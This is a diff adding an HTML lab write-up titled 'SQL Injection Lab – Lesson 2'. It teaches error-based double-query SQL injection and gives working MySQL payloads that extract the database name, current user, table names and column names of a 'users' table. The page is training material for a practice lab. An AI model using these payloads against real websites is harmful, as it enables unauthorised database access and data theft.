@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Lab – Lesson 2 (Double Query Injection)</title>
+
+  <style>
+    :root {
+      --bg: #0d0f17;
+      --surface: #13151c;
+      --text: #a0a8b8;
+      --accent: #7aa2f7;
+      --border: #24283b;
+      --cyan: #7dcfff;
+      --green: #9ece6a;
+      --yellow: #e0af68;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Cascadia Code", "Fira Mono", Consolas, monospace;
+      background: var(--bg);
+      color: var(--text);
+      font-size: 14px;
+      line-height: 1.55;
+      min-height: 100vh;
+    }
+
+    .bar {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 4px 12px;
+      display: flex;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .bar span { color: var(--accent); }
+
+    .wrap {
+      max-width: 960px;
+      margin: auto;
+      padding: 2rem 1rem;
+    }
+
+    .prompt { color: var(--green); }
+    .cmd    { color: var(--yellow); }
+
+    img {
+      max-width: 100%;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      margin: 1rem 0;
+    }
+
+    h1, h2, h3 {
+      color: var(--accent);
+      margin-top: 1.5rem;
+      margin-bottom: .5rem;
+    }
+    h1 { font-size: 1.4rem; }
+    h2 { font-size: 1.2rem; }
+    h3 { font-size: 1.05rem; }
+
+    code {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 2px 4px;
+      border-radius: 3px;
+      color: var(--yellow);
+      font-size: 13px;
+    }
+
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: .75rem 1rem;
+      overflow-x: auto;
+      margin: .5rem 0;
+    }
+
+    ul {
+      margin-left: 1.2rem;
+      margin-top: .5rem;
+    }
+    li { margin-bottom: .25rem; }
+
+    .tags {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: .5rem .75rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: .5rem;
+      margin: 1rem 0;
+    }
+    .tag {
+      background: var(--accent);
+      color: var(--bg);
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem 0;
+      color: var(--cyan);
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="bar">
+    <span>user@lab</span>
+    <span>~/sqli-lesson-02</span>
+  </div>
+
+  <main class="wrap">
+    <h1>SQL Injection Lab – Lesson 2 (Double Query Injection)</h1>
+
+    <div class="tags">
+      <span class="tag">SQL Injection</span>
+      <span class="tag">Double Query Injection</span>
+      <span class="tag">Web Security</span>
+      <span class="tag">Labs</span>
+    </div>
+
+    <h2>Double Query (Sub-Query) Injection</h2>
+
+    <h3>Inject parameter</h3>
+    <ol>
+      <li>Look for parameters placed inside single quotes: <code>id='...'</code></li>
+      <li>Confirm the app shows errors or returns a page that changes on bad input (even if message hidden — error may still be logged).</li>
+    </ol>
+    <p>If the response changes, parameter is injectable. If you get SQL error, good — proceed carefully.</p>
+
+    <h2>Dumping database name</h2>
+    <p>Payload:</p>
+    <pre><code>1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)b) --+</code></pre>
+    <p>If error shows <strong>Database name</strong>, you succeeded.</p>
+    <img src="../../../../assets/images/sqli-02/ss1.jpg" alt="ss1">
+
+    <h2>Dumping current-user</h2>
+    <p>Payload:</p>
+    <pre><code>1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select current_user()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)b) --+</code></pre>
+    <p>You can see the <strong>current_user</strong> in the error.</p>
+    <img src="../../../../assets/images/sqli-02/ss2.jpg" alt="ss2">
+
+    <h2>Dumping tables</h2>
+    <p>Payloads:</p>
+    <pre><code>1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b) --+</code></pre>
+    <p>You can see the <strong>tables</strong> in error.</p>
+    <img src="../../../../assets/images/sqli-02/ss3.jpg" alt="ss3">
+
+    <pre><code>1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b) --+</code></pre>
+    <img src="../../../../assets/images/sqli-02/ss4.jpg" alt="ss4">
+
+    <pre><code>1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b) --+</code></pre>
+    <img src="../../../../assets/images/sqli-02/ss5.jpg" alt="ss5">
+
+    <pre><code>1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b) --+</code></pre>
+    <img src="../../../../assets/images/sqli-02/ss6.jpg" alt="ss6">
+
+    <h2>Dumping data from tables</h2>
+    <p>Payload:</p>
+    <pre><code>1' AND (select 1 from (select count(*), concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a) b) --+</code></pre>
+    <img src="../../../../assets/images/sqli-02/ss7.jpg" alt="ss7">
+
+    <p>You can dump more data by changing the <strong>limit</strong> in query.</p>
+  </main>
+
+  <footer>
+    <span>EOF ── happy hacking :)</span>
+  </footer>
+</body>
+</html>
